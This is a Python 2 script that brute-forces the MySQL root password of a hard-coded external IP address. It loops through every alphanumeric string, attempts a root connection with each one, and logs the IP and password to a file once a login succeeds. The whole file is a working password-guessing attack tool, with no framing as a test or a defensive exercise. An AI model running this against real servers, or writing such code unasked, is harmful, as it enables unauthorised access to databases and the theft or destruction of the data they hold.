# -*- coding: utf-8 -*-
"""
Created on Wed Jan  6 00:42:11 2016

@author: hus
"""

# -*- coding: utf-8 -*-
"""
Created on Sun Nov 22 19:17:15 2015

@author: hus
"""

import MySQLdb,time

#iport = 'locahost'
iport = '125.65.77.34'
word = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
length = len(word)
passlevel = 1
passnumber = [0]
password = ''

def nextpassnumber(passnumber):
    passnumber[0] += 1
    return checkpassnumber(passnumber)

def checkpassnumber(passnumber):
    level = len(passnumber)
    for i in range(0,level):
        if passnumber[i] >=length:
            if i != level -1:
                passnumber[i] = 0
                passnumber[i+1] += 1
            else:
                passnumber[i] = 0
                passnumber.append(0)
    return changepassnumber(passnumber)

def changepassnumber(passnumber):
    passwd = ''
    level = len(passnumber)
    for i in range(level-1,-1,-1):
        passwd = passwd + word[passnumber[i]]
    return passwd

def mysqloop(password):
    try:
        conn = MySQLdb.connect(iport,"root",password)
        conn.close()
        print 'success, and password:%s' % password
        return True
    except MySQLdb.Error, e:
        print "MySQL Error %d: %s  password:%s" %(e.args[0], e.args[1], password)
        return False

import Queue, threading, time





#mysqloop(password)
count = 1
t1 = time.ctime()
tt1 = time.time()
while True:
    if mysqloop(password) == True:
        passlog = open('/home/hus/Documents/python/pass.log','w')
        passlog.write('ip:%s'%iport)
        passlog.write('\npassword:%s'%password)
        passlog.close()
        break
    else:
        #print 'False, password:%s' % password
        password = nextpassnumber(passnumber)
        count+=1
t2 = time.ctime()
tt2 = time.time()
print 't1:',t1
print 't2:',t2
print 'count:', count
print 'tt:', float(tt2)-float(tt1)